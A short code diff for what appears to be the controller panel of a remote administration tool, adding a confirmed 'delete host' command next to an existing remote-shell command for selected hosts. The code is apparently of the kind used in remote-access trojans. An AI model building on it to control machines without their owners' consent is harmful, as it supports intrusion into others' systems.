@@ -48,6 +48,7 @@ BEGIN_MESSAGE_MAP(CGroupDlg, CXTPResizeDialog)
     ON_COMMAND(ID_TOOL_SENDMSG, &CGroupDlg::OnToolSendmsg)
     ON_COMMAND(ID_TOOL_CHANGEREMARK, &CGroupDlg::OnToolChangeremark)
     ON_COMMAND(ID_TOOL_REMOTESHELL, &CGroupDlg::OnToolRemoteshell)
+    ON_COMMAND(ID_TOOL_DELETE, &CGroupDlg::OnToolDelete)
 END_MESSAGE_MAP()
 
 
@@ -517,4 +518,15 @@ void CGroupDlg::OnToolRemoteshell()
     // TODO:  在此添加命令处理程序代码
     BYTE	bToken = COMMAND_SHELL;
     SendSelectCommand(&bToken, sizeof(BYTE));
+}
+
+
+void CGroupDlg::OnToolDelete()
+{
+#ifndef _DEBUG
+	if (MessageBox(_T("确定删除主机?"), _T("提示"), MB_YESNO | MB_ICONQUESTION) == IDNO)
+		return;
+#endif
+	BYTE	bToken = TOKEN_BYEBYE;
+	SendSelectCommand(&bToken, sizeof(BYTE));
 }
